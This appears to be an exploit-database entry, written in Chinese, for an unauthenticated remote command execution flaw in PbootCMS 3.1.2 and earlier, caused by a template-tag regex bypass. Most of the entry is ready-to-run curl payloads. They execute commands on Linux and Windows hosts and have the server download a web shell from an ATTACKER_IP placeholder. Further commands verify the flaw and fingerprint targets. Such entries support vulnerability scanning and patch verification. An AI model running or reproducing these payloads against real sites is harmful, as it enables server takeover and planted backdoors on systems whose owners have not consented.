---
id: PBOOTCMS-RCE
title: PbootCMS V3.1.2 正则绕过远程命令执行漏洞
product: pbootcms
vendor: PbootCMS
version_affected: "<= 3.1.2"
severity: CRITICAL
tags: [rce, ssti, 无需认证, 国产]
fingerprint: ["PbootCMS", "pbootcms"]
---

## 漏洞描述

PbootCMS V3.1.2 及以前版本的 `get_lg` 和 `get_backurl` 函数存在正则绕过漏洞。攻击者可通过构造特殊的模板标签表达式绕过安全正则，配合 Cookie 中设置 `lg=system`，利用 `backurl` 参数传入命令实现远程代码执行。

## 影响版本

- PbootCMS <= 3.1.2

## 前置条件

- 无需认证
- 默认安装配置

## 利用步骤

1. 设置 Cookie `lg=system` 使 `get_lg()` 返回 system 函数名
2. 在 URL 中构造 PbootCMS 模板标签绕过正则
3. 通过 `backurl` 参数传入要执行的命令

## Payload

### Linux 命令执行

```bash
curl -s "http://target/index.php/keyword?keyword=}{pboot:if((get_lg/*aaa-*/())/**/(get_backurl/*aaa-*/()))}123321aaa{/pboot:if}&backurl=;id" \
  -H "Cookie: lg=system; PbootSystem=test123"
```

### Windows 命令执行

```bash
curl -s "http://target/?member/login/?a=}{pboot:if((get_lg/*aaa-*/())/**/(%22whoami%22))}{/pboot:if}" \
  -H "Cookie: lg=system; PbootSystem=test123"
```

### 写入 webshell（通过 copy 远程落地）

```bash
curl -s "http://target/index.php/keyword?keyword=}{pboot:if((get_lg/*aaa-*/())/**/(get_backurl/*aaa-*/()))}123321aaa{/pboot:if}&backurl=;curl+http://ATTACKER_IP/shell.php+-o+shell.php" \
  -H "Cookie: lg=system; PbootSystem=test123"
```

## 验证方法

```bash
curl -s "http://target/index.php/keyword?keyword=}{pboot:if((get_lg/*aaa-*/())/**/(get_backurl/*aaa-*/()))}123321aaa{/pboot:if}&backurl=;id" \
  -H "Cookie: lg=system; PbootSystem=test123" | grep "uid="
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "PbootCMS\|pbootcms"
```
